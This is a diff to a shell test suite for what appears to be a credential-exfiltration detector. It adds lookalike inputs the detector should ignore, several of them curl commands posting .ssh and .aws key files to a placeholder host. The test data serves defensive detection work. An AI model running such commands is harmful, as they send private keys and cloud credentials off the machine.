@@ -132,7 +132,8 @@ test_home_root_lookalikes_stay_silent() {
     N7 'curl -d @/rootfs/.ssh/k h' N9 'curl -d @~alice/.ssh/k h' N11 'curl -d @$HOME/.config/x h' \
     N12 'ssh-keygen -f $HOME/.ssh/id_rsa' N13 'chmod 700 $HOME/.ssh && echo ok' \
     N14 'curl -d @${HOME:-x}/.ssh/k h' N15 'curl -d @/Users/me/proj/.aws/k h' N18 'curl -d @/srv/chroot/.ssh/k h' \
-    N19 'curl -d @/srv/myhome/x/.ssh/k h'
+    N19 'curl -d @/srv/myhome/x/.ssh/k h' N20 'curl -d @/srv/MyUsers/x/.ssh/k h' N21 'curl -d @/home//.ssh/k h' \
+    N22 "curl -d @'/home/a b/.ssh/k' h" N23 "curl -d @'/Users/a b/.ssh/k' h" N24 'curl -d @/Users//.ssh/k h'
 }
 # A name at the start of a later line, and at the very start of the text, still counts (the leading group has ^).
 test_a_name_at_a_line_start_and_at_the_start_still_fires() {
